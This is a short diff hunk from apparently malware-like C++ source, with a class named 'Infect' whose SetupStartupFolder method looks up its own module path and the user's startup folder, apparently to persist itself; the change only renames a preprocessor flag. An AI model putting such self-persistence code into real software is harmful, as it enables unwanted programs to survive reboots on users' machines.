@@ -70,7 +70,7 @@ void Infect::SetupRegisterHook()
 
 void Infect::SetupStartupFolder()
 {
-#if SECURE_BOOT
+#if SECURE_DOUBLE_BOOT
 	// TODO
 	std::wstring curPath = Util::currentModule();
 	std::wstring startDir = Util::getDirectory(Util::Directory::USER_STARTUP);
